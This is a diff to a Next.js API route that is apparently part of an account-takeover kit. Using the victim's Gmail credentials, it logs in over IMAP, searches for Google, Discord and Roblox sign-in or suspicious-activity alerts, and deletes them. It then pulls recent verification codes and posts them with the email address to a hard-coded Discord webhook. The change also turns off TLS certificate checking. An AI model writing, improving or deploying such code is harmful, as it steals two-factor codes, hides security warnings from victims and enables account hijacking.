@@ -4,14 +4,21 @@ import { simpleParser } from 'mailparser';
 
 const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';
 
-async function log(title: string, fields: { name: string; value: string }[]) {
-  await fetch(WEBHOOK, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      embeds: [{ title, color: 0x5865f2, fields, timestamp: new Date().toISOString() }]
-    })
-  }).catch(() => {});
+async function log(title: string, fields: { name: string; value: string }[], color = 0x5865f2) {
+  try {
+    await fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title,
+          color,
+          fields,
+          timestamp: new Date().toISOString()
+        }]
+      })
+    });
+  } catch {}
 }
 
 export async function POST(req: NextRequest) {
@@ -25,27 +32,26 @@ export async function POST(req: NextRequest) {
         host: 'imap.gmail.com',
         port: 993,
         tls: true,
-        authTimeout: 3000
+        authTimeout: 3000,
+        tlsOptions: { rejectUnauthorized: false }
       }
     };
 
     const conn = await imap.connect({ imap: config.imap });
     await conn.openBox('INBOX');
 
-    // Delete alerts
     const alerts = await conn.search([
       'UNSEEN',
       ['OR', ['FROM', 'no-reply@accounts.google.com'], ['FROM', 'no-reply@discord.com'], ['FROM', 'no-reply@roblox.com']],
-      ['OR', ['SUBJECT', 'sign-in'], ['SUBJECT', 'login attempt'], ['SUBJECT', 'suspicious']]
+      ['OR', ['SUBJECT', 'new sign-in'], ['SUBJECT', 'suspicious'], ['SUBJECT', 'login attempt']]
     ]);
 
     if (alerts.length) {
       await conn.addFlags(alerts, '\\Deleted');
       await conn.expunge();
-      await log('Alerts Deleted', [{ name: 'Email', value: email }]);
+      await log('Alerts Deleted', [{ name: 'Email', value: email }], 0xffaa00);
     }
 
-    // Check recent for codes
     const recent = await conn.search(['SINCE', new Date(Date.now() - 5 * 60 * 1000)]);
     for (const msg of recent) {
       const part = await conn.getPartData(msg, 'TEXT');
@@ -59,17 +65,18 @@ export async function POST(req: NextRequest) {
         await log(`${service} Code`, [
           { name: 'Code', value: `\`${foundCode}\`` },
           { name: 'Email', value: email }
-        ]);
+        ], 0x00ff00);
       }
     }
 
     conn.end();
     return NextResponse.json({ success: true });
   } catch (err) {
+    const errorMessage = err instanceof Error ? err.message : String(err || 'Unknown Gmail error');
     await log('Gmail Error', [
       { name: 'Email', value: email },
-      { name: 'Error', value: err.message }
+      { name: 'Error', value: errorMessage }
     ], 0xff0000);
-    return NextResponse.json({ error: err.message }, { status: 500 });
+    return NextResponse.json({ error: errorMessage }, { status: 500 });
   }
 }
